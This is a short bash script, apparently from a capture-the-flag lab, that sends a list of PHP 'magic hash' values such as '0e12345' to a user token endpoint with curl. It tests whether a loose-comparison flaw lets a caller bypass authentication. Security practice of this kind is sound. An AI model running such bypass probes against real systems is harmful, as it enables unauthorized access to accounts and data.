tokens=("0" "0e0" "0e1" "0e12345" "00" "0.0")

for token in "${tokens[@]}"; do
  echo "=== Testing token: $token ==="
  curl -s "http://monitorsfour.htb/user?token=$token"
  echo -e "\n"
done
